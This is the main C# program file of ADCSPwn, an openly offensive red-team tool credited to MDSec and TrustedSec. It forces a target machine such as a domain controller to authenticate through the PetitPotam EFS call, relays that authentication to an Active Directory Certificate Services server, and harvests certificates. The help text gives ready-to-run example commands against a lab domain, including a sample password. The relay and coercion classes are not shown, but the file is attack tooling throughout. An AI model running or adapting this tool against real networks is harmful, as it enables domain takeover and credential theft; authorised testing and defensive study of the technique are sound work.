using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ADCSPwn
{
    class Program
    {
        static void ShowHelp()
        {
            Console.WriteLine("adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]\n");

            Console.WriteLine("Required arguments:");
            Console.WriteLine("adcs\t\t-\tThis is the address of the AD CS server which authentication will be relayed to.");

            Console.WriteLine("\nOptional arguments:");
            Console.WriteLine("port\t\t-\tThe port ADCSPwn will listen on.");
            Console.WriteLine("remote\t\t-\tRemote machine to trigger authentication from.");
            Console.WriteLine("username\t-\tUsername for non-domain context.");
            Console.WriteLine("password\t-\tPassword for non-domain context.");
            Console.WriteLine("dc\t\t-\tDomain controller to query for Certificate Templates (LDAP).");
            Console.WriteLine("unc\t\t-\tSet custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .");
            Console.WriteLine("output\t\t-\tOutput path to store base64 generated crt.");

            Console.WriteLine("\nExample usage:");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --port 9001");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local");
            Console.WriteLine("adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --dc dc.pwnlab.local --unc \\\\WIN-WORK01.pwnlab.local\\made\\up\\share");
        }

        static void ShowBanner()
        {
            Console.WriteLine(Config.banner);
            Console.WriteLine("Author: @_batsec_ - MDSec ActiveBreach");
            Console.WriteLine("Contributor: @Flangvik -  TrustedSec\n");
        }

        static void ParseArgs(string[] args)
        {
           

            int iter = 0;
            foreach (string item in args)
            {
                switch (item)
                {
                    case "--port":
                        Config.port = int.Parse(args[iter + 1]);
                        break;
                    case "--adcs":
                        Config.adcs = args[iter + 1];
                        break;
                    case "--remote":
                        Config.machine = args[iter + 1];
                        break;
                    case "--username":
                        Config.username = args[iter + 1];
                        break;
                    case "--password":
                        Config.password = args[iter + 1];
                        break;
                    case "--dc":
                        Config.dc = args[iter + 1];
                        break;
                    case "--unc":
                        Config.unc = args[iter + 1];
                        break;
                    case "--output":
                        Config.outpath = args[iter + 1];
                        break;
                    case "--secure":
                        Config.secure = true;
                        break;
                    default:
                        break;
                }

                ++iter;
            }
        }


        static void Main(string[] args)
        {
           
            ShowBanner();


            if (args.Contains("-help"))
            {
                ShowHelp();
                return;
            }

            if (args.Length < 2)
            {
                ShowHelp();
                return;
            }

            ParseArgs(args);

            TemplateHunter templatehunter = new TemplateHunter(Config.username, Config.password, Config.dc);

            try
            {
                String[] templates = templatehunter.FindAll();

                var certcount = templates.Count();

                Console.WriteLine("[i] Found " + certcount + " certificate templates");

                RelayServer relayserver = new RelayServer();
                relayserver.Initialize(templates);

                Console.WriteLine("[i] Triggering authentication from target ({0})\n", Config.machine);

                EFSTrigger.CoerceMachineAuth(Config.machine, Config.unc);

                while (true)
                {
                    Thread.Sleep(10000);
                    continue;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
